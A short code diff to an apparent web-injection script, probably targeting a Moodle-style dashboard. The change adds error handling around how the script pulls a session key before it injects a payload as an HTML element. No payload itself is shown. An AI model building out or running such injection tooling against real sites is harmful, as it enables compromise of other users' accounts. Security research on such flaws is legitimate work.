@@ -31,7 +31,11 @@ def get_html_element_id(content):
 
 
 def inject(url, sess, payload, verbose, check_mode=False):
-	sesskey = sess.get(url + '/my/').text.split('<input type="hidden" name="sesskey" value="')[1].split('"')[0]
+	try:
+		sesskey = sess.get(url + '/my/').text.split('<input type="hidden" name="sesskey" value="')[1].split('"')[0]
+	except IndexError:
+		print('[X] Error while retrieving sesskey on dashboard')
+		return False
 	
 	# enable dashboard editing mode
 	if verbose > 1: print('[*] Adding HTML Element')
